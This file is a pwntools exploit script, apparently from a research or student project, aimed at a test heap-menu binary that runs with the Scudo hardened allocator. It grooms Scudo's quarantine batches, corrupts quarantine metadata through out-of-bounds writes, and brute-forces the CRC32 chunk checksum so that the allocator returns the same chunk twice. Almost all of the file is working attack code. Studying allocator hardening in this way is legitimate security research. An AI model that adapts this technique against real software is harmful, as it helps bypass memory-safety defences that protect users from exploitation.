#!/usr/bin/python3
from pwn import *
import binascii

elf = context.binary = ELF("../malloc-menu-linux")

gs = '''
continue
'''

env = {"LD_PRELOAD": "/mnt/BA_Project/libscudo-linux.so"}

if args.NOSCUDO:
    env = {}
elif args.QUARANTINE:
    env["SCUDO_OPTIONS"] = ":".join([
        "thread_local_quarantine_size_kb=64",
        "quarantine_size_kb=256",
        "quarantine_max_chunk_size=2048"
    ])

    
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs, env=env)
    else:
        return process(elf.path, env=env, stdin=PTY)

# Select the "malloc" option, send size & data.
def malloc(size, data=b""):
    io.send(b"1\n")
    io.sendafter(b"allocate: ", f"{size}\n".encode())
    chunk = io.recvline()
    index = chunk.split(b' ')[4]
    address = int(chunk.split(b' ')[7], 16)
    if len(data) != 0:
        io.sendafter(b"quit\n", b"3\n")
        io.sendafter(b"address: ", b"2\n")
        io.sendafter(b"address: ", f"{hex(address)}\n".encode())
        io.sendafter(b"write: ", f"{len(data)}\n".encode())
        io.sendafter(b"write: ", data)
        io.send(b"\n")
    return (index, address)

# Send the "free" option, send the address
def free(address):
    io.send(b"2\n")
    io.sendafter(b"address: ", b"2\n")
    io.sendafter(b"address: ", f"{hex(address)}\n".encode())

def write(address, data):
    io.send(b"3\n")
    io.sendafter(b"address: ", b"2\n")
    io.sendafter(b"address: ", f"{hex(address)}\n".encode())
    io.sendafter(b"write: ", f"{len(data)}\n".encode())
    io.sendafter(b"write: ", data)
    io.send(b"\n")

def read(address, size):
    io.send(b"4\n")
    io.sendafter(b"address: ", b"2\n")
    io.sendafter(b"address: ", f"{hex(address)}\n".encode())
    io.sendafter(b"read: ", f"{size}\n".encode())
    res = []
    for i in range((size//16)+1):
        res.append(int(io.recvline(keepends=False), base=16))
    return res

def get_libc_leak():
    io.send(b"6\n")
    io.recvuntil(b'@ ')
    leak = int(io.recvline(keepends=False), base=16) - elf.libc.sym.puts
    return leak

def populate_quarantine():
    for i in range(0x1000):
        free(malloc(0x20+i)[1])

def find_chksum(inuse_chksum):
    i = 0
    _crc = 0
    chunk_ptr = 0x41414141
    while _crc != inuse_chksum:
        i += 1
        _crc = binascii.crc32(0x10101, binascii.crc32(chunk_ptr, i))
        _crc = _crc ^ (_crc >> 0x10)
    _crc = binascii.crc32(0x10201, binascii.crc32(chunk_ptr, i))
    _crc = _crc ^ (_crc >> 0x10)
    return _crc&0xffff

def fill_qbatch(n, y):
    x = (0x10000-8176-y)+1
    tmp = 0
    zp = n - (x % n)
    pp = x//n
    for i in range(n):
        if i >= zp:
            tmp = malloc(pp+1)
        else:
            tmp = malloc(pp)
        free(tmp)

def fill_complete_qbatch():
    for _ in range(1019):
        _, addr = malloc(1)
        free(addr)

def fill_qbatch_with_chunk(addr, size, count):
    fill_qbatch(count-1, size)
    free(addr)
    
io = start()


# =============================================================================

quarInd, quarAdd = malloc(8176)
targetInd, targetAdd = malloc(0x10)

chksum_inuse = read(targetAdd-16, 2)

info(f"chksum at addr: {chksum_inuse}, {hex(targetAdd)}, {hex(targetAdd-16)}")

info("preparing quarantine")

for j in range(2):
    for i in range(6):
        info(f"filling {j} {i}")
        fill_complete_qbatch()
    fill_qbatch(600, 0xd782)

info("prepare qbatch_1 and qbatch_2")
fill_complete_qbatch()
fill_qbatch(420, 8176+0x3fb)
fill_qbatch_with_chunk(targetAdd, 0x10, 451)

for i in range(2):
    fill_complete_qbatch()

fill_qbatch(450, (0x3fb+8176)*2)

for i in range(6):
    fill_complete_qbatch()

fill_qbatch(600, 0xd782)

info("corrupt quarantine")

for i in range(0xb):
    write(quarAdd+0x2402+0x400+i, 451)

returned_once = 0
    
for i in range(0x20000):
    p = malloc(0x10)
    if p==targetAdd:
        if returned_once:
            success("Achieved double return\n")
            break
        returned_once = 1
        info("Bruteforcing to find the correct checksum and fix it\n");
        write(targetAdd-2, find_chksum(chksum_inuse)<<(8*6)+0x10201)
    free(malloc(0x123))

# =============================================================================

io.interactive()
